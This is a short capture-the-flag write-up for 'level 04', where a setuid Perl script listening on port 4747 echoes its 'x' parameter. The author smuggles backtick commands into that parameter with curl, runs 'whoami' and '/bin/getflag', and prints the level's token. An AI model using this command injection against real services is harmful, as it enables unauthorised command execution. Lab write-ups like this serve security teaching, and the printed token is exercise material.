## LEVEL 04

---

In this level, we have a Perl script named `level04.pl` with the setuid bit set for the user `flag04`.

After examining the Perl script, we can see that it is listening on port `4747` and receiving the `x` parameter from the user. It then prints the result of the `echo` command on the screen. We can use this vulnerability to execute any command we want through the `x` parameter.

We can test this by using the `curl` command with the `x` parameter set to a command enclosed in backquotes. For example, we can execute the `whoami` command using the following command:

```shell
$ curl 'localhost:4747?x=`whoami`'
flag04
```

We can see that the `whoami` command was executed and returned the user `flag04`. Now, we can execute the `getflag` command in a similar way:

```shell
$ curl 'localhost:4747?x=`/bin/getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

We have successfully exploited the vulnerability in the Perl script and retrieved the token for this level.

---

*Source:*

*https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands*